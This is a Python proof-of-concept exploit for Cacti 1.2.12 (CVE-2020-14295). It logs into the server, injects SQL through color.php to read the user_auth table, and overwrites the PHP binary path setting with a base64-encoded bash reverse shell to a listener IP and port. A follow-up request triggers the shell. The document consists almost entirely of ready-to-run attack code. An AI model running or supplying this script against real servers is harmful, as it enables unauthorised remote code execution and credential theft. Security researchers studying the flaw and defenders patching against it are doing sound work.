#!/usr/bin/python3
# Exploit Title: cacti 1.2.12 - SQLI to RCE on colors.php [Authenticated]
# Date: Jun 17, 2020
# Vulnerability Founder : Mayfly [https://github.com/Mayfly277]
# Exploit Author:  Mayfly [https://github.com/Mayfly277]
# Exploit refference : https://github.com/Cacti/cacti/issues/3622
# Vendor Homepage: http://www.cacti.net
# Software Link: https://github.com/Cacti/cacti/archive/refs/tags/release/1.2.12.zip
# Version: v1.2.12
# Tested on: Ubuntu
# CVE : CVE-2020-14295
# POC exploit author - 0z09e [https://github.com/0z09e]
# POC exploit written on - 29/04/2021


import requests
import sys
from base64 import b64encode
import argparse

blue = "\033[34m"                                                                                                                                                                          
bold = "\033[1m"                                                                                                                                                                              
green = "\033[32m"                                                                                                                                                                            
purple = "\033[95m"                            
red = "\033[91m"                               
end = "\033[0m"

def ap(text) :                  
    print(f"{bold}{green}[+] {end}{text}")
def ainfo(text) :     
    print(f"{bold}{purple}[*] {end}{text}")
def aerr(text) :                              
    print(f"{bold}{red}[-] {end}{text}")

def exploit(target , username , password , ip , port):
    session = requests.session()
    ainfo("Sending initial request to the target")
    try:
        initial_req = session.get(f"{target}/cacti")
        
        lines = list(map(str , initial_req.text.split()))
        if "csrfMagicToken=" in initial_req.text:
            lines = list(map(str , initial_req.text.split()))
            for line in lines:
                if "csrfMagicToken=" in line:
                    try:
                        csrf = line.split("csrfMagicToken=\'")[1].replace("\';" , "")
                        ap("Found CSRF token.")
                    except:
                        aerr("CSRF token not found")
                        sys.exit()
    except:
        aerr("Target isn't alive")
        sys.exit()
    data = {
        "__csrf_magic" : csrf,
        "action" : "login",
        "login_username" : username,
        "login_password" : password
    }
    session.post(f"{target}/cacti/index.php" , data=data , allow_redirects=False )
    ainfo("Generating payload.")
    bash_payload = b64encode(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1".encode("ascii"))
    sqli_payload = requests.utils.quote(f"1') UNION SELECT 1,username,password,4,5,6,7 from user_auth;update settings set value='echo {bash_payload}|base64 -d|bash;' where name='path_php_binary';-- -")
    session.get(f"{target}/cacti/color.php?action=export&header=false&filter={sqli_payload}")
    ap("Payload sent.")
    try:
        session.get(f"{target}/cacti/host.php?action=reindex" , allow_redirects=False , timeout=1 ).text
    except:
        ap("Payload triggered, check listener :)")


if __name__ == "__main__":
    parse = argparse.ArgumentParser()
    parser = parse.add_argument_group('required arguments')
    parser.add_argument("-t" , metavar="Target" , help="Target URL" , required=True)
    parser.add_argument("-U" , metavar="Username" , help="Cacti username" , required=True)
    parser.add_argument("-P" , metavar="Password" , help="Cacti password" , required=True)
    parser.add_argument("-i" , metavar="Shell-IP" , help="Reverse-Shell IP" , required=True)
    parser.add_argument("-p" , metavar="Shell-Port" , help="Reverse-Shell Port" , required=True)
    args = parse.parse_args()
    target = args.t
    username = args.U
    password = args.P
    ip = args.i 
    port = args.p
    exploit(target , username , password , ip , port)   
